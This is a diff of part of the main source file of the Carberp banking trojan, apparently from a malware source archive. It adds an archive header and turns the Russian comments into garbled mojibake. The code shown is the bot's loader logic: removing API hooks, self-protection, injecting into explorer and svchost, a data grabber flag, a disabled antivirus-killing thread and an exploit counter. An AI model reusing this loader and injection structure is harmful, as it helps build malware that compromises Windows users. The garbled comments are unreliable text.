@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "GetApi.h"
@@ -26,14 +37,14 @@
 #include "BotDebug.h"
 
 
-//********************** Отладочные шаблоны **********************************
+//********************** пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ **********************************
 
 namespace MAINDBGTEMPLATES
 {
 	#include "DbgTemplates.h"
 }
 
-// Объявляем шаблон вывода отладочных строк
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 #define MDBG MAINDBGTEMPLATES::DBGOutMessage<>
 
 
@@ -43,14 +54,14 @@ namespace MAINDBGTEMPLATES
 #pragma comment(linker, "/ENTRY:MyMain" )
 
 
-DWORD dwKillPid		 = 0; //пид для убийства процесса бота
-DWORD dwFirst	     = 0; //запуск в первый раз
-DWORD dwAlreadyRun   = 0; //если уже запущены
-DWORD dwGrabberRun	 = 0; //отработал ли граббер
-DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
-//DWORD dwExplorerPid  = 0; //пид эксплорера
+DWORD dwKillPid		 = 0; //пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+DWORD dwFirst	     = 0; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+DWORD dwAlreadyRun   = 0; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+DWORD dwGrabberRun	 = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+DWORD dwExplorerSelf = 0; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//DWORD dwExplorerPid  = 0; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-//получаем пид эксплорера
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 
 
@@ -61,17 +72,17 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 	UnhookDlls();
 	ProtectBot();
 
-	// Отключаем отображение ошибок при крахе процесса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DisableShowFatalErrorDialog();
 
-	// Вызываем событие
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	bool Cancel = false;
 	SVChostStart(NULL, Cancel);
 	if (Cancel)
 	{
-		// Убиваем процесс svchost
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ svchost
 		pExitProcess(1);
-		return 0; // для компилятора
+		return 0; // пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	}
 
 
@@ -92,7 +103,7 @@ void ExplorerMain()
 	if ( !dwExplorerSelf )
 		UnhookDlls();
 
-	// Отключаем отображение ошибок при крахе процесса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DisableShowFatalErrorDialog();
 
 
@@ -109,7 +120,7 @@ void ExplorerMain()
 	//MegaJump(AvFuckThread);
 
 
-	// Вызываем событие мтарта експлорера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (dwFirst)
 		ExplorerFirstStart(NULL);
@@ -124,7 +135,7 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 {
 	UnhookDlls();
 
-	if ( dwExplorerSelf ) //если инжект был в свой эксплорер завершаемся
+	if ( dwExplorerSelf ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		dwExplorerSelf = 0;
 
@@ -160,7 +171,7 @@ LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
 ATOM RegMyWindowClass(HINSTANCE, LPCTSTR);
 
 ////////////////////////////////////////////////////////////////////////// 
-// функция вхождений программы WinMain
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ WinMain
 
 #include"BotCore.h"
 int APIENTRY MyMain() 
@@ -172,14 +183,14 @@ int APIENTRY MyMain()
 			return 0;
 	#endif
 
-	UnhookDlls(); //снимаем хуки
+	UnhookDlls(); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
 	WCHAR ModulePath[ MAX_PATH ];
 
 	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
 	DWORD dwProcessHash = GetNameHash( ModulePath );
 
-	if ( dwProcessHash == GetBotHash() ) // запуск из самого бота
+	if ( dwProcessHash == GetBotHash() ) // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	{
 		
 		DWORD dwExploits = 0;
